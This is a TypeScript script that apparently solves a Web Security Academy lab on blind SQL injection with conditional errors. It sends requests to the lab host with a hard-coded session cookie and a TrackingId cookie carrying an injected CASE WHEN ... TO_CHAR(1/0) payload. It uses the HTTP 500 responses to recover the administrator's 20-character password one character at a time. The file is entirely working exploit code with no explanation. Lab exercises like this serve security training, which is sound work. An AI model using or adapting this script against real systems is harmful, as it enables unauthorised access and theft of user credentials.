async function Blind_SQL_injection_with_conditional_errors() {
  const trackingId = "YUw5DjjA1NCBljlO";
  const session = "V6YewNgxfiwzhe7iiBEvX9APoGifBlir";
  const url =
    "https://0ad700fd041d3040808f0d46009c0089.web-security-academy.net/";
  const passwordLength = 20;
  const letters = Array(26)
    .fill(0)
    .map((_, i) => String.fromCharCode(97 + i));
  const numbers = Array(10)
    .fill(0)
    .map((_, i) => `${i}`);
  const passwordChars = letters.concat(numbers);
  const password: string[] = [];
  for (let i = 0; i < passwordLength; i++) {
    for (const passwordChar of passwordChars) {
      console.log({ i, passwordChar });
      const response = await fetch(url, {
        headers: {
          cookie: `session=${session}; TrackingId=${trackingId}' AND (SELECT CASE WHEN (SUBSTR(password, ${i + 1}, 1) = '${passwordChar}') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username = 'administrator') = 'a`,
        },
      });
      if (response.status === 500) {
        password[i] = passwordChar;
        break;
      }
    }
  }
  console.log("result");
  console.log(password.join(""));
}

Blind_SQL_injection_with_conditional_errors();
